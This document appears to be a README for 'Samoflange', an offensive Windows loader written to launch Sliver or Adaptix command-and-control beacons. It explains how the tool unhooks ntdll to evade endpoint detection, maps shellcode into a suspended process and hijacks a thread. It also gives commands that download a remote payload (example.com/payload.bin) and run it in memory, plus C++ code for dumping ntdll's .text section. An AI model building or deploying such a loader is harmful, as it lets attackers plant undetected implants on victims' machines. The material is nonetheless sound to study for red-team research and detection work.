# Samoflange
I created this loader specifically to spawn Sliver or Adaptix beacons. It doesn't catch the resolution of the payload and transfer it back, it's very much a fire-and-forget kind of loader.

I couldn't think of a good name, there isn't any meaning behind it in this case. https://www.youtube.com/watch?v=nbPWMKOBf0g

* First we download a clean copy of ntdll's .text section, Next we patch the current processes ntdll to avoid api hooking.
* Then we spawn a suspended process with `PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON`, and map the downloaded shellcode to it with `NtCreateSection` and `NtMapViewOfSection`.
* Finally we locate and hijack and existing thread in the created process to load the payload without creating new threads or making APC calls. It's worth noting that it can take a bit(30 seconds to 1 minute) for the payload to execute once the thread is hijacked. We're changing the context, but Windows probably won't schedule the thread to run instantly.

Also I refactored a couple of the functions that I tend to copy-paste between projects.

The donut generator requires donut shellcode: https://github.com/TheWover/donut
```
pip install donut-shellcode
```
It should work with any shellcode though, not only donut.
## Usage:
Create your payload
```
python donutGenerator.py -i DOUBTFUL_MANTEL.exe -x "Hello World"
```
Host the payload file and ntdll.dll's text section on a web server and use the loader to download into memory and execute. By default it expects the text section to be named `ntdll.text`.
```
.\Samoflange.exe /p:http://example.com/payload.bin /x:"Hello World"
```
Omit -x or /x: if not using XOR functionality.

## References:
https://www.ired.team/offensive-security/code-injection-process-injection/injecting-to-remote-process-via-thread-hijacking

https://maldevacademy.com/

https://trustedsec.com/blog/malware-series-process-injection-mapped-sections

Fun fact, if you pass `PROCESS_CREATION_MITIGATION_POLICY_STRICT_HANDLE_CHECKS_ALWAYS_ON` with `UpdateProcThreadAttribute` it will also mess with spectre mitigations.

If you don't want to use my ntdll.text or are targetting a different windows version you can use the following C++ function to extract the .text section from your own system.
```
BOOL DumpLocalNtdllTextSection(const char* outputPath) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;

    PBYTE base = (PBYTE)hNtdll;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sections = (PIMAGE_SECTION_HEADER)((BYTE*)&nt->OptionalHeader +
        nt->FileHeader.SizeOfOptionalHeader);

    PBYTE textStart = NULL;
    DWORD textSize = 0;
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sections[i].Name, ".text", 5) == 0) {
            textStart = base + sections[i].VirtualAddress;
            textSize = sections[i].Misc.VirtualSize;
            break;
        }
    }

    if (!textStart || textSize == 0) {
        printf("[-] Failed to locate .text section in ntdll.dll\n");
        return FALSE;
    }

    FILE* fp = NULL;
    fopen_s(&fp, outputPath, "wb");
    if (!fp) {
        printf("[-] Failed to open %s for writing\n", outputPath);
        return FALSE;
    }

    if (fwrite(textStart, 1, textSize, fp) != textSize) {
        printf("[-] Failed to write full text section to disk\n");
        fclose(fp);
        return FALSE;
    }

    fclose(fp);
    printf("[+] Dumped .text section to %s (%u bytes)\n", outputPath, textSize);
    return TRUE;
}
```
